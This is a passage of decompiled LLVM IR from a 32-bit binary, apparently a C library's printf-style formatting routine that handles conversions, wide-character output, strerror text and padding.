  %v9_805b566 = icmp eq i32 %v3_805b558, 3
  %v1_805b569 = icmp eq i1 %v9_805b566, false
  br i1 %v1_805b569, label %dec_label_pc_805b572, label %dec_label_pc_805b56b

dec_label_pc_805b56b:                             ; preds = %dec_label_pc_805b566
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_805b58b

dec_label_pc_805b572:                             ; preds = %dec_label_pc_805b566
  %v9_805b572 = icmp eq i32 %v3_805b558, 4
  %v1_805b575 = icmp eq i1 %v9_805b572, false
  br i1 %v1_805b575, label %dec_label_pc_805b58b, label %dec_label_pc_805b577

dec_label_pc_805b577:                             ; preds = %dec_label_pc_805b572
  %tmp = icmp ugt i32 %v0_805b577, %v1_805b547
  br i1 %tmp, label %dec_label_pc_805b58b, label %dec_label_pc_805b57b

dec_label_pc_805b57b:                             ; preds = %dec_label_pc_805b577
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_805b580 = inttoptr i32 %v0_805b58b to i8*
  %v2_805b580 = load i8, i8* %v1_805b580, align 1
  %v8_805b580 = icmp eq i8 %v2_805b580, 48
  br i1 %v8_805b580, label %dec_label_pc_805b58b, label %dec_label_pc_805b585

dec_label_pc_805b585:                             ; preds = %dec_label_pc_805b57b
  %v1_805b585 = add i32 %v2_805b543, 128
  store i32 %v1_805b585, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805b58b

dec_label_pc_805b58b:                             ; preds = %dec_label_pc_805b577, %dec_label_pc_805b57b, %dec_label_pc_805b572, %dec_label_pc_805b551, %dec_label_pc_805b56b, %dec_label_pc_805b585
  %v0_805b5c3 = phi i32 [ %v0_805b577, %dec_label_pc_805b577 ], [ 1, %dec_label_pc_805b57b ], [ %v0_805b577, %dec_label_pc_805b572 ], [ %v0_805b577, %dec_label_pc_805b551 ], [ %v0_805b577, %dec_label_pc_805b56b ], [ %v1_805b585, %dec_label_pc_805b585 ]
  %v1_805b58b = inttoptr i32 %v0_805b58b to i8*
  %v2_805b58b = load i8, i8* %v1_805b58b, align 1
  %v8_805b58b = icmp eq i8 %v2_805b58b, 48
  %v1_805b58e = icmp eq i1 %v8_805b58b, false
  br i1 %v1_805b58e, label %dec_label_pc_805b5bb, label %dec_label_pc_805b590

dec_label_pc_805b590:                             ; preds = %dec_label_pc_805b58b
  %v0_805b590 = load i32, i32* @ebp, align 4
  %v7_805b593 = icmp sgt i32 %v0_805b590, 5
  br i1 %v7_805b593, label %dec_label_pc_805b595, label %dec_label_pc_805b59a

dec_label_pc_805b595:                             ; preds = %dec_label_pc_805b590
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_805b59a

dec_label_pc_805b59a:                             ; preds = %dec_label_pc_805b590, %dec_label_pc_805b595
  %v1_805b59a = add i32 %v0_805b59a, 48
  %v2_805b59a = inttoptr i32 %v1_805b59a to i32*
  %v3_805b59a = load i32, i32* %v2_805b59a, align 4
  %v12_805b59a = icmp eq i32 %v3_805b59a, 1
  %v1_805b59f = icmp eq i1 %v12_805b59a, false
  br i1 %v1_805b59f, label %dec_label_pc_805b5b0, label %dec_label_pc_805b5a1

dec_label_pc_805b5a1:                             ; preds = %dec_label_pc_805b59a
  store i32 ptrtoint ([6 x i8]* @global_var_806cbcc.731 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_805b72c

dec_label_pc_805b5b0:                             ; preds = %dec_label_pc_805b59a
  %v1_805b5b0 = icmp eq i32 %v0_805b5c3, 0
  %v1_805b5b2 = icmp eq i1 %v1_805b5b0, false
  br i1 %v1_805b5b2, label %dec_label_pc_805b5bb, label %dec_label_pc_805b5b4

dec_label_pc_805b5b4:                             ; preds = %dec_label_pc_805b5b0
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805b72c

dec_label_pc_805b5bb:                             ; preds = %dec_label_pc_805b5b0, %dec_label_pc_805b58b
  %v2_805b5bb = sub i32 %v0_805b5c3, %v1_805b547
  %v7_805b5bb = icmp ult i32 %v0_805b5c3, %v1_805b547
  %v12_805b5bb = icmp eq i32 %v2_805b5bb, 0
  %v2_805b5bd = or i1 %v7_805b5bb, %v12_805b5bb
  br i1 %v2_805b5bd, label %dec_label_pc_805b72c, label %dec_label_pc_805b5c3

dec_label_pc_805b5c3:                             ; preds = %dec_label_pc_805b5bb
  store i32 %v2_805b5bb, i32* @ebx, align 4
  br label %dec_label_pc_805b746

dec_label_pc_805b5cc:                             ; preds = %dec_label_pc_805b462
  %tmp89 = icmp ult i32 %v3_805b434, 16
  br i1 %tmp89, label %dec_label_pc_805b5d1, label %dec_label_pc_805b616

dec_label_pc_805b5d1:                             ; preds = %dec_label_pc_805b5cc
  %v1_805b5d1 = add i32 %v0_805b434.lcssa, 33
  %v2_805b5d1 = inttoptr i32 %v1_805b5d1 to i8*
  %v3_805b5d1 = load i8, i8* %v2_805b5d1, align 1
  %v4_805b5d1 = and i8 %v3_805b5d1, 8
  %v5_805b5d1 = icmp eq i8 %v4_805b5d1, 0
  %v1_805b5d6 = add i32 %v0_805b434.lcssa, 344
  %v2_805b5d6 = inttoptr i32 %v1_805b5d6 to i32*
  %v3_805b5d6 = load i32, i32* %v2_805b5d6, align 4
  store i32 %v3_805b5d6, i32* %edx.global-to-local, align 4
  br i1 %v5_805b5d1, label %dec_label_pc_805b5e3, label %dec_label_pc_805b5df

dec_label_pc_805b5df:                             ; preds = %dec_label_pc_805b5d1
  %v1_805b5df = inttoptr i32 %v3_805b5d6 to x86_fp80*
  %v2_805b5df = load x86_fp80, x86_fp80* %v1_805b5df, align 4
  br label %dec_label_pc_805b5e5

dec_label_pc_805b5e3:                             ; preds = %dec_label_pc_805b5d1
  %v1_805b5e3 = inttoptr i32 %v3_805b5d6 to double*
  %v2_805b5e3 = load double, double* %v1_805b5e3, align 4
  %v3_805b5e3 = fpext double %v2_805b5e3 to x86_fp80
  br label %dec_label_pc_805b5e5

dec_label_pc_805b5e5:                             ; preds = %dec_label_pc_805b5df, %dec_label_pc_805b5e3
  %storemerge4 = phi x86_fp80 [ %v2_805b5df, %dec_label_pc_805b5df ], [ %v3_805b5e3, %dec_label_pc_805b5e3 ]
  store x86_fp80 %storemerge4, x86_fp80* %st0.global-to-local, align 4
  %v0_805b5e5 = load i32, i32* @esi, align 4
  %v2_805b5e5 = add i32 %v0_805b434.lcssa, -4
  %v3_805b5e5 = inttoptr i32 %v2_805b5e5 to i32*
  store i32 %v0_805b5e5, i32* %v3_805b5e5, align 4
  %v0_805b5e6 = load i32, i32* @esi, align 4
  %v2_805b5e6 = add i32 %v0_805b434.lcssa, -8
  %v3_805b5e6 = inttoptr i32 %v2_805b5e6 to i32*
  store i32 %v0_805b5e6, i32* %v3_805b5e6, align 4
  %v1_805b5e7 = add i32 %v0_805b434.lcssa, -12
  %v2_805b5e7 = inttoptr i32 %v1_805b5e7 to i32*
  store i32 134591146, i32* %v2_805b5e7, align 4
  %v1_805b5ec = add i32 %v0_805b434.lcssa, 20
  store i32 %v1_805b5ec, i32* %eax.global-to-local, align 4
  %v2_805b5f0 = add i32 %v0_805b434.lcssa, -16
  %v3_805b5f0 = inttoptr i32 %v2_805b5f0 to i32*
  store i32 %v1_805b5ec, i32* %v3_805b5f0, align 4
  %v1_805b5f1 = add i32 %v0_805b434.lcssa, -28
  %v1_805b5f4 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_805b5f4 = inttoptr i32 %v1_805b5f1 to x86_fp80*
  store x86_fp80 %v1_805b5f4, x86_fp80* %v3_805b5f4, align 4
  %v1_805b5f7 = add i32 %v0_805b434.lcssa, 368
  %v2_805b5f7 = inttoptr i32 %v1_805b5f7 to i32*
  %v3_805b5f7 = load i32, i32* %v2_805b5f7, align 4
  %v5_805b5f7 = add i32 %v0_805b434.lcssa, -32
  %v6_805b5f7 = inttoptr i32 %v5_805b5f7 to i32*
  store i32 %v3_805b5f7, i32* %v6_805b5f7, align 4
  %v0_805b5fe = call i32 @_fpmaxtostr()
  store i32 %v0_805b5fe, i32* %eax.global-to-local, align 4
  %v0_805b603 = load i32, i32* @esp, align 4
  %v1_805b603 = add i32 %v0_805b603, 32
  %v2_805b606 = icmp slt i32 %v0_805b5fe, 0
  br i1 %v2_805b606, label %dec_label_pc_805b8a7, label %dec_label_pc_805b60e

dec_label_pc_805b60e:                             ; preds = %dec_label_pc_805b5e5
  %v1_805b60e = inttoptr i32 %v1_805b603 to i32*
  %v2_805b60e = load i32, i32* %v1_805b60e, align 4
  %v4_805b60e = add i32 %v2_805b60e, %v0_805b5fe
  store i32 %v4_805b60e, i32* %v1_805b60e, align 4
  %v0_805b894.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805b894

dec_label_pc_805b616:                             ; preds = %dec_label_pc_805b5cc
  %tmp90 = or i32 %v3_805b434, 1
  %tmp91 = icmp eq i32 %tmp90, 17
  br i1 %tmp91, label %dec_label_pc_805b61f, label %dec_label_pc_805b6b2

dec_label_pc_805b61f:                             ; preds = %dec_label_pc_805b616
  %v9_805b616 = icmp eq i32 %v3_805b434, 17
  %v1_805b61f = add i32 %v0_805b434.lcssa, 332
  %v2_805b61f = inttoptr i32 %v1_805b61f to i32*
  store i32 0, i32* %v2_805b61f, align 4
  %v0_805b62a = load i32, i32* @esp, align 4
  %v1_805b62a = add i32 %v0_805b62a, 344
  %v2_805b62a = inttoptr i32 %v1_805b62a to i32*
  %v3_805b62a = load i32, i32* %v2_805b62a, align 4
  store i32 %v3_805b62a, i32* %edx.global-to-local, align 4
  %v1_805b631 = icmp eq i1 %v9_805b616, false
  br i1 %v1_805b631, label %dec_label_pc_805b67d, label %dec_label_pc_805b633

dec_label_pc_805b633:                             ; preds = %dec_label_pc_805b61f
  %v1_805b633 = inttoptr i32 %v3_805b62a to i32*
  %v2_805b633 = load i32, i32* %v1_805b633, align 4
  store i32 %v2_805b633, i32* %eax.global-to-local, align 4
  %v2_805b635 = add i32 %v0_805b62a, 340
  %v3_805b635 = inttoptr i32 %v2_805b635 to i32*
  store i32 %v2_805b633, i32* %v3_805b635, align 4
  %v0_805b63c = load i32, i32* %eax.global-to-local, align 4
  %v1_805b63c = icmp eq i32 %v0_805b63c, 0
  br i1 %v1_805b63c, label %dec_label_pc_805b730, label %dec_label_pc_805b644

dec_label_pc_805b644:                             ; preds = %dec_label_pc_805b633
  %v0_805b644 = load i32, i32* @esp, align 4
  %v1_805b644 = add i32 %v0_805b644, 20
  %v2_805b644 = inttoptr i32 %v1_805b644 to i32*
  %v3_805b644 = load i32, i32* %v2_805b644, align 4
  store i32 %v3_805b644, i32* %eax.global-to-local, align 4
  %v2_805b64b = icmp slt i32 %v3_805b644, 0
  br i1 %v2_805b64b, label %dec_label_pc_805b651, label %dec_label_pc_805b64f

dec_label_pc_805b64f:                             ; preds = %dec_label_pc_805b644
  br label %dec_label_pc_805b651

dec_label_pc_805b651:                             ; preds = %dec_label_pc_805b644, %dec_label_pc_805b64f
  %storemerge95 = phi i32 [ %v3_805b644, %dec_label_pc_805b64f ], [ -1, %dec_label_pc_805b644 ]
  store i32 %storemerge95, i32* %ecx.global-to-local, align 4
  %v1_805b651 = add i32 %v0_805b644, 340
  store i32 %v1_805b651, i32* %edx.global-to-local, align 4
  %v1_805b658 = add i32 %v0_805b644, 332
  store i32 %v1_805b658, i32* %eax.global-to-local, align 4
  %v2_805b65f = add i32 %v0_805b644, -4
  %v3_805b65f = inttoptr i32 %v2_805b65f to i32*
  store i32 %v1_805b658, i32* %v3_805b65f, align 4
  %v0_805b660 = load i32, i32* %ecx.global-to-local, align 4
  %v2_805b660 = add i32 %v0_805b644, -8
  %v3_805b660 = inttoptr i32 %v2_805b660 to i32*
  store i32 %v0_805b660, i32* %v3_805b660, align 4
  %v0_805b661 = load i32, i32* %edx.global-to-local, align 4
  %v2_805b661 = add i32 %v0_805b644, -12
  %v3_805b661 = inttoptr i32 %v2_805b661 to i32*
  store i32 %v0_805b661, i32* %v3_805b661, align 4
  %v0_805b662 = load i32, i32* %edx.global-to-local, align 4
  %v2_805b662 = add i32 %v0_805b644, -16
  %v3_805b662 = inttoptr i32 %v2_805b662 to i32*
  store i32 %v0_805b662, i32* %v3_805b662, align 4
  %v0_805b663 = call i32 @__GI_wcsrtombs()
  store i32 %v0_805b663, i32* %eax.global-to-local, align 4
  %v0_805b668 = load i32, i32* @esp, align 4
  %v1_805b668 = add i32 %v0_805b668, 16
  store i32 %v0_805b663, i32* @esi, align 4
  %v10_805b66d = icmp eq i32 %v0_805b663, -1
  br i1 %v10_805b66d, label %dec_label_pc_805b8a7, label %dec_label_pc_805b676

dec_label_pc_805b676:                             ; preds = %dec_label_pc_805b651
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_805b73a

dec_label_pc_805b67d:                             ; preds = %dec_label_pc_805b61f
  %v0_805b67d = load i32, i32* @ebx, align 4
  %v2_805b67d = add i32 %v0_805b62a, -4
  %v3_805b67d = inttoptr i32 %v2_805b67d to i32*
  store i32 %v0_805b67d, i32* %v3_805b67d, align 4
  %v1_805b67e = add i32 %v0_805b62a, 332
  store i32 %v1_805b67e, i32* %eax.global-to-local, align 4
  %v2_805b685 = add i32 %v0_805b62a, -8
  %v3_805b685 = inttoptr i32 %v2_805b685 to i32*
  store i32 %v1_805b67e, i32* %v3_805b685, align 4
  %v0_805b686 = load i32, i32* %edx.global-to-local, align 4
  %v1_805b686 = inttoptr i32 %v0_805b686 to i32*
  %v2_805b686 = load i32, i32* %v1_805b686, align 4
  %v4_805b686 = add i32 %v0_805b62a, -12
  %v5_805b686 = inttoptr i32 %v4_805b686 to i32*
  store i32 %v2_805b686, i32* %v5_805b686, align 4
  %v1_805b688 = add i32 %v0_805b62a, 204
  store i32 %v1_805b688, i32* @ebx, align 4
  %v2_805b68f = add i32 %v0_805b62a, -16
  %v3_805b68f = inttoptr i32 %v2_805b68f to i32*
  store i32 %v1_805b688, i32* %v3_805b68f, align 4
  %v0_805b690 = call i32 @__GI_wcrtomb()
  store i32 %v0_805b690, i32* %eax.global-to-local, align 4
  %v0_805b695 = load i32, i32* @esp, align 4
  %v1_805b695 = add i32 %v0_805b695, 16
  store i32 %v0_805b690, i32* @esi, align 4
  %v10_805b69a = icmp eq i32 %v0_805b690, -1
  br i1 %v10_805b69a, label %dec_label_pc_805b8a7, label %dec_label_pc_805b6a3

dec_label_pc_805b6a3:                             ; preds = %dec_label_pc_805b67d
  %v0_805b6a3 = load i32, i32* @ebx, align 4
  store i32 %v0_805b6a3, i32* @edi, align 4
  %v2_805b6a5 = add i32 %v0_805b690, 220
  %v3_805b6a5 = add i32 %v2_805b6a5, %v0_805b695
  %v4_805b6a5 = inttoptr i32 %v3_805b6a5 to i8*
  store i8 0, i8* %v4_805b6a5, align 1
  br label %dec_label_pc_805b73a

dec_label_pc_805b6b2:                             ; preds = %dec_label_pc_805b616
  %tmp92 = icmp ult i32 %v3_805b434, 20
  br i1 %tmp92, label %dec_label_pc_805b6b7, label %dec_label_pc_805b702

dec_label_pc_805b6b7:                             ; preds = %dec_label_pc_805b6b2
  %v9_805b6b2 = icmp eq i32 %v3_805b434, 19
  %v1_805b6b7 = add i32 %v0_805b434.lcssa, 344
  %v2_805b6b7 = inttoptr i32 %v1_805b6b7 to i32*
  %v3_805b6b7 = load i32, i32* %v2_805b6b7, align 4
  store i32 %v3_805b6b7, i32* %edx.global-to-local, align 4
  %v1_805b6be = icmp eq i1 %v9_805b6b2, false
  %v1_805b6e3 = inttoptr i32 %v3_805b6b7 to i32*
  %v2_805b6e3 = load i32, i32* %v1_805b6e3, align 4
  br i1 %v1_805b6be, label %dec_label_pc_805b6e3, label %dec_label_pc_805b6c0

dec_label_pc_805b6c0:                             ; preds = %dec_label_pc_805b6b7
  store i32 %v2_805b6e3, i32* @edi, align 4
  %v1_805b6c2 = icmp eq i32 %v2_805b6e3, 0
  br i1 %v1_805b6c2, label %dec_label_pc_805b730, label %dec_label_pc_805b6c6

dec_label_pc_805b6c6:                             ; preds = %dec_label_pc_805b6c0, %dec_label_pc_805b70b
  %v1_805b6d3 = phi i32 [ %v0_805b434.lcssa, %dec_label_pc_805b6c0 ], [ %v1_805b725, %dec_label_pc_805b70b ]
  %v1_805b6c6 = add i32 %v1_805b6d3, 20
  %v2_805b6c6 = inttoptr i32 %v1_805b6c6 to i32*
  %v3_805b6c6 = load i32, i32* %v2_805b6c6, align 4
  store i32 %v3_805b6c6, i32* %eax.global-to-local, align 4
  %v2_805b6cd = icmp slt i32 %v3_805b6c6, 0
  br i1 %v2_805b6cd, label %dec_label_pc_805b6d3, label %dec_label_pc_805b6d1

dec_label_pc_805b6d1:                             ; preds = %dec_label_pc_805b6c6
  br label %dec_label_pc_805b6d3

dec_label_pc_805b6d3:                             ; preds = %dec_label_pc_805b6c6, %dec_label_pc_805b6d1
  %storemerge = phi i32 [ %v3_805b6c6, %dec_label_pc_805b6d1 ], [ -1, %dec_label_pc_805b6c6 ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_805b6d3 = add i32 %v1_805b6d3, -4
  %v3_805b6d3 = inttoptr i32 %v2_805b6d3 to i32*
  store i32 %v3_805b434, i32* %v3_805b6d3, align 4
  %v2_805b6d4 = add i32 %v1_805b6d3, -8
  %v3_805b6d4 = inttoptr i32 %v2_805b6d4 to i32*
  store i32 %v3_805b434, i32* %v3_805b6d4, align 4
  %v0_805b6d5 = load i32, i32* %edx.global-to-local, align 4
  %v2_805b6d5 = add i32 %v1_805b6d3, -12
  %v3_805b6d5 = inttoptr i32 %v2_805b6d5 to i32*
  store i32 %v0_805b6d5, i32* %v3_805b6d5, align 4
  %v0_805b6d6 = load i32, i32* @edi, align 4
  %v2_805b6d6 = add i32 %v1_805b6d3, -16
  %v3_805b6d6 = inttoptr i32 %v2_805b6d6 to i32*
  store i32 %v0_805b6d6, i32* %v3_805b6d6, align 4
  %v0_805b6d7 = call i32 @strnlen()
  store i32 %v0_805b6d7, i32* %eax.global-to-local, align 4
  store i32 %v0_805b6d7, i32* @esi, align 4
  br label %dec_label_pc_805b73a

dec_label_pc_805b6e3:                             ; preds = %dec_label_pc_805b6b7
  store i32 %v2_805b6e3, i32* %eax.global-to-local, align 4
  %v1_805b6e5 = add i32 %v0_805b434.lcssa, 204
  store i32 %v1_805b6e5, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  %v1_805b6f1 = trunc i32 %v2_805b6e3 to i8
  %v4_805b6f1 = inttoptr i32 %v1_805b6e5 to i8*
  store i8 %v1_805b6f1, i8* %v4_805b6f1, align 1
  %v0_805b6f8 = load i32, i32* @esp, align 4
  %v1_805b6f8 = add i32 %v0_805b6f8, 205
  %v2_805b6f8 = inttoptr i32 %v1_805b6f8 to i8*
  store i8 0, i8* %v2_805b6f8, align 1
  br label %dec_label_pc_805b73a

dec_label_pc_805b702:                             ; preds = %dec_label_pc_805b6b2
  %v9_805b702 = icmp eq i32 %v3_805b434, 20
  %v1_805b705 = icmp eq i1 %v9_805b702, false
  br i1 %v1_805b705, label %dec_label_pc_805b8a7, label %dec_label_pc_805b70b

dec_label_pc_805b70b:                             ; preds = %dec_label_pc_805b702
  %v0_805b70b = load i32, i32* %stack_var_-364, align 4
  %v1_805b70b = call i32 @__errno_location(i32 %v0_805b70b)
  store i32 %v1_805b70b, i32* %eax.global-to-local, align 4
  %v0_805b710 = load i32, i32* @edx, align 4
  %v1_805b710 = load i32, i32* @esp, align 4
  %v2_805b710 = add i32 %v1_805b710, -4
  %v3_805b710 = inttoptr i32 %v2_805b710 to i32*
  store i32 %v0_805b710, i32* %v3_805b710, align 4
  %v1_805b711 = add i32 %v1_805b710, -8
  %v2_805b711 = inttoptr i32 %v1_805b711 to i32*
  store i32 128, i32* %v2_805b711, align 4
  %v1_805b716 = add i32 %v1_805b710, 204
  store i32 %v1_805b716, i32* %edx.global-to-local, align 4
  %v2_805b71d = add i32 %v1_805b710, -12
  %v3_805b71d = inttoptr i32 %v2_805b71d to i32*
  store i32 %v1_805b716, i32* %v3_805b71d, align 4
  %v1_805b71e = inttoptr i32 %v1_805b70b to i32*
  %v2_805b71e = load i32, i32* %v1_805b71e, align 4
  %v4_805b71e = add i32 %v1_805b710, -16
  %v5_805b71e = inttoptr i32 %v4_805b71e to i32*
  store i32 %v2_805b71e, i32* %v5_805b71e, align 4
  %v0_805b720 = load i32, i32* %stack_var_-364, align 4
  %v3_805b720 = call i32 @__GI___glibc_strerror_r(i32 %v0_805b720, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805b720, i32* %eax.global-to-local, align 4
  %v0_805b725 = load i32, i32* @esp, align 4
  %v1_805b725 = add i32 %v0_805b725, 16
  store i32 %v3_805b720, i32* @edi, align 4
  br label %dec_label_pc_805b6c6

dec_label_pc_805b72c:                             ; preds = %dec_label_pc_805b5bb, %dec_label_pc_805b5b4, %dec_label_pc_805b5a1
  %v0_805b74636 = phi i32 [ %v1_805b547, %dec_label_pc_805b5bb ], [ 0, %dec_label_pc_805b5b4 ], [ 5, %dec_label_pc_805b5a1 ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805b746

dec_label_pc_805b730:                             ; preds = %dec_label_pc_805b6c0, %dec_label_pc_805b633
  store i32 ptrtoint ([7 x i8]* @global_var_806cbd2.732 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_805b73a

dec_label_pc_805b73a:                             ; preds = %dec_label_pc_805b6e3, %dec_label_pc_805b6d3, %dec_label_pc_805b6a3, %dec_label_pc_805b676, %dec_label_pc_805b730
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_805b741 = load i32, i32* @esp, align 4
  %v1_805b741 = add i32 %v0_805b741, 7
  %v2_805b741 = inttoptr i32 %v1_805b741 to i8*
  store i8 32, i8* %v2_805b741, align 1
  %v0_805b746.pre = load i32, i32* @esi, align 4
  %v1_805b746.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805b746

dec_label_pc_805b746:                             ; preds = %dec_label_pc_805b72c, %dec_label_pc_805b5c3, %dec_label_pc_805b73a
  %v1_805b746 = phi i32 [ 0, %dec_label_pc_805b72c ], [ %v2_805b5bb, %dec_label_pc_805b5c3 ], [ %v1_805b746.pre, %dec_label_pc_805b73a ]
  %v0_805b746 = phi i32 [ %v0_805b74636, %dec_label_pc_805b72c ], [ %v1_805b547, %dec_label_pc_805b5c3 ], [ %v0_805b746.pre, %dec_label_pc_805b73a ]
  %v2_805b746 = add i32 %v0_805b746, %v1_805b746
  store i32 %v2_805b746, i32* @edx, align 4
  %v0_805b749 = load i32, i32* @ebp, align 4
  %v9_805b749 = icmp eq i32 %v0_805b749, 11
  br i1 %v9_805b749, label %dec_label_pc_805b75a, label %dec_label_pc_805b74e

dec_label_pc_805b74e:                             ; preds = %dec_label_pc_805b746
  %v1_805b750 = add i32 %v0_805b749, -5
  %v6_805b750 = sub i32 4, %v0_805b749
  %v7_805b750 = and i32 %v6_805b750, %v0_805b749
  %v8_805b750 = icmp slt i32 %v7_805b750, 0
  %v9_805b750 = icmp eq i32 %v1_805b750, 0
  %v10_805b750 = icmp slt i32 %v1_805b750, 0
  %v3_805b753 = icmp eq i1 %v10_805b750, %v8_805b750
  %v4_805b753 = icmp eq i1 %v9_805b750, false
  %v5_805b753 = and i1 %v4_805b753, %v3_805b753
  %v6_805b753 = zext i1 %v5_805b753 to i32
  store i32 %v6_805b753, i32* %eax.global-to-local, align 4
  %v2_805b756 = add i32 %v2_805b746, 1
  %v3_805b756 = add i32 %v2_805b756, %v6_805b753
  store i32 %v3_805b756, i32* @edx, align 4
  br label %dec_label_pc_805b75a

dec_label_pc_805b75a:                             ; preds = %dec_label_pc_805b746, %dec_label_pc_805b74e
  %v0_805b75a = load i32, i32* @esp, align 4
  %v1_805b75a = add i32 %v0_805b75a, 24
  %v2_805b75a = inttoptr i32 %v1_805b75a to i32*
  %v3_805b75a = load i32, i32* %v2_805b75a, align 4
  store i32 %v3_805b75a, i32* %eax.global-to-local, align 4
  %v1_805b75e = add i32 %v0_805b75a, 8
  %v2_805b75e = inttoptr i32 %v1_805b75e to i32*
  store i32 0, i32* %v2_805b75e, align 4
  %v0_805b766 = load i32, i32* %eax.global-to-local, align 4
  %v1_805b766 = load i32, i32* @edx, align 4
  %v2_805b766 = sub i32 %v0_805b766, %v1_805b766
  %v7_805b766 = icmp ult i32 %v0_805b766, %v1_805b766
  %v12_805b766 = icmp eq i32 %v2_805b766, 0
  %v2_805b768 = or i1 %v7_805b766, %v12_805b766
  br i1 %v2_805b768, label %dec_label_pc_805b770, label %dec_label_pc_805b76a

dec_label_pc_805b76a:                             ; preds = %dec_label_pc_805b75a
  store i32 %v2_805b766, i32* %eax.global-to-local, align 4
  %v1_805b76c = load i32, i32* @esp, align 4
  %v2_805b76c = add i32 %v1_805b76c, 8
  %v3_805b76c = inttoptr i32 %v2_805b76c to i32*
  store i32 %v2_805b766, i32* %v3_805b76c, align 4
  %v0_805b774.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805b770

dec_label_pc_805b770:                             ; preds = %dec_label_pc_805b75a, %dec_label_pc_805b76a
  %v0_805b774 = phi i32 [ %v1_805b766, %dec_label_pc_805b75a ], [ %v0_805b774.pre, %dec_label_pc_805b76a ]
  %v0_805b770 = load i32, i32* @esp, align 4
  %v1_805b770 = add i32 %v0_805b770, 8
  %v2_805b770 = inttoptr i32 %v1_805b770 to i32*
  %v3_805b770 = load i32, i32* %v2_805b770, align 4
  store i32 %v3_805b770, i32* @ecx, align 4
  %v2_805b774 = add i32 %v3_805b770, %v0_805b774
  store i32 %v2_805b774, i32* %eax.global-to-local, align 4
  %v1_805b777 = inttoptr i32 %v0_805b770 to i32*
  %v2_805b777 = load i32, i32* %v1_805b777, align 4
  %v4_805b777 = add i32 %v2_805b777, %v2_805b774
  store i32 %v4_805b777, i32* %v1_805b777, align 4
  %v0_805b77a = load i32, i32* @esp, align 4
  %v1_805b77a = add i32 %v0_805b77a, 7
  %v2_805b77a = inttoptr i32 %v1_805b77a to i8*
  %v3_805b77a = load i8, i8* %v2_805b77a, align 1
  %v9_805b77a = icmp eq i8 %v3_805b77a, 48
  %v1_805b77f = icmp eq i1 %v9_805b77a, false
  br i1 %v1_805b77f, label %dec_label_pc_805b78b, label %dec_label_pc_805b781

dec_label_pc_805b781:                             ; preds = %dec_label_pc_805b770
  %v0_805b781 = load i32, i32* @ebx, align 4
  %v1_805b781 = load i32, i32* @ecx, align 4
  %v2_805b781 = add i32 %v1_805b781, %v0_805b781
  store i32 %v2_805b781, i32* @ebx, align 4
  %v1_805b783 = add i32 %v0_805b77a, 8
  %v2_805b783 = inttoptr i32 %v1_805b783 to i32*
  store i32 0, i32* %v2_805b783, align 4
  %v0_805b78b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805b78b

dec_label_pc_805b78b:                             ; preds = %dec_label_pc_805b770, %dec_label_pc_805b781
  %v0_805b792 = phi i32 [ %v0_805b77a, %dec_label_pc_805b770 ], [ %v0_805b78b.pre, %dec_label_pc_805b781 ]
  %v1_805b78b = add i32 %v0_805b792, 32
  %v2_805b78b = inttoptr i32 %v1_805b78b to i8*
  %v3_805b78b = load i8, i8* %v2_805b78b, align 1
  %v4_805b78b = and i8 %v3_805b78b, 8
  %v5_805b78b = icmp eq i8 %v4_805b78b, 0
  %v1_805b790 = icmp eq i1 %v5_805b78b, false
  br i1 %v1_805b790, label %dec_label_pc_805b7b9, label %dec_label_pc_805b792

dec_label_pc_805b792:                             ; preds = %dec_label_pc_805b78b
  %v1_805b792 = add i32 %v0_805b792, 8
  %v2_805b792 = inttoptr i32 %v1_805b792 to i32*
  %v3_805b792 = load i32, i32* %v2_805b792, align 4
  store i32 %v3_805b792, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_805b79b = add i32 %v0_805b792, 368
  %v2_805b79b = inttoptr i32 %v1_805b79b to i32*
  %v3_805b79b = load i32, i32* %v2_805b79b, align 4
  store i32 %v3_805b79b, i32* @eax, align 4
  %v0_805b7a2 = call i32 @_charpad()
  store i32 %v0_805b7a2, i32* %eax.global-to-local, align 4
  %v1_805b7a7 = load i32, i32* @esp, align 4
  %v2_805b7a7 = add i32 %v1_805b7a7, 8
  %v3_805b7a7 = inttoptr i32 %v2_805b7a7 to i32*
  %v4_805b7a7 = load i32, i32* %v3_805b7a7, align 4
  %v15_805b7a7 = icmp eq i32 %v0_805b7a2, %v4_805b7a7
  %v1_805b7ab = icmp eq i1 %v15_805b7a7, false
  br i1 %v1_805b7ab, label %dec_label_pc_805b8a7, label %dec_label_pc_805b7b1

dec_label_pc_805b7b1:                             ; preds = %dec_label_pc_805b792
  store i32 0, i32* %v3_805b7a7, align 4
  %v1_805b7b9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805b7b9

dec_label_pc_805b7b9:                             ; preds = %dec_label_pc_805b78b, %dec_label_pc_805b7b1
  %v1_805b7b9 = phi i32 [ %v0_805b792, %dec_label_pc_805b78b ], [ %v1_805b7b9.pre, %dec_label_pc_805b7b1 ]
  %v0_805b7b9 = load i32, i32* %eax.global-to-local, align 4
  %v2_805b7b9 = add i32 %v1_805b7b9, -4
  %v3_805b7b9 = inttoptr i32 %v2_805b7b9 to i32*
  store i32 %v0_805b7b9, i32* %v3_805b7b9, align 4
  %v0_805b7ba = load i32, i32* %eax.global-to-local, align 4
  %v2_805b7ba = add i32 %v1_805b7b9, -8
  %v3_805b7ba = inttoptr i32 %v2_805b7ba to i32*
  store i32 %v0_805b7ba, i32* %v3_805b7ba, align 4
  %v1_805b7bb = add i32 %v1_805b7b9, 368
  %v2_805b7bb = inttoptr i32 %v1_805b7bb to i32*
